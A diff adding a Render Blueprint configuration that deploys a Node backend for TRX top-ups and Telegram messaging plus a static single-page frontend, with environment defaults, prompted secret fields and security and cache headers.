@@ -1,0 +1,89 @@
+##############################################
+# ONE Blueprint = Frontend + Backend on Render
+##############################################
+# How to use:
+# 1) Push this whole repo to GitHub
+# 2) Render Dashboard → New → Blueprint
+# 3) Connect repo → Render reads this file
+# 4) Fill the 5 secret fields when prompted
+# 5) Apply → both services deploy automatically
+#
+# Backend URL (already used by frontend JS):
+#   https://tronscantelegram.onrender.com
+# Frontend URL (after deploy):
+#   https://tronscan-frontend.onrender.com
+
+services:
+  # =========================================================
+  # BACKEND — TRX top-up + Telegram API
+  # Live URL: https://tronscantelegram.onrender.com
+  # =========================================================
+  - type: web
+    name: tronscantelegram
+    runtime: node
+    plan: free
+    region: oregon
+    rootDir: tronscantelegram-main
+    buildCommand: npm install
+    startCommand: npm start
+    healthCheckPath: /health
+    autoDeployTrigger: commit
+    envVars:
+      # Auto-configured defaults (aligned with frontend minTrx = 11)
+      - key: NODE_VERSION
+        value: "20"
+      - key: AUTO_SEND_AMOUNT
+        value: "13"
+      - key: MINIMUM_BALANCE
+        value: "11"
+      - key: FEE_RESERVE_TRX
+        value: "1"
+      - key: TRONGRID_FULL_HOST
+        value: "https://api.trongrid.io"
+      - key: RATE_LIMIT_MAX
+        value: "2000"
+
+      # Prompted once in Blueprint UI (secrets)
+      - key: TRON_PRIVATE_KEY
+        sync: false
+      - key: TRON_ADDRESS
+        sync: false
+      - key: TRONGRID_API_KEY
+        sync: false
+      - key: BOT_TOKEN
+        sync: false
+      - key: CHAT_ID
+        sync: false
+
+  # =========================================================
+  # FRONTEND — Static SPA
+  # Live URL: https://tronscan-frontend.onrender.com
+  # =========================================================
+  - type: web
+    name: tronscan-frontend
+    runtime: static
+    plan: free
+    region: oregon
+    buildCommand: chmod +x scripts/build-frontend.sh && ./scripts/build-frontend.sh
+    staticPublishPath: ./dist
+    autoDeployTrigger: commit
+    headers:
+      - path: /*
+        name: X-Frame-Options
+        value: DENY
+      - path: /*
+        name: X-Content-Type-Options
+        value: nosniff
+      - path: /static/*
+        name: Cache-Control
+        value: "public, max-age=31536000, immutable"
+      - path: /
+        name: Cache-Control
+        value: "no-cache"
+      - path: /index.html
+        name: Cache-Control
+        value: "no-cache"
+    routes:
+      - type: rewrite
+        source: /*
+        destination: /index.html
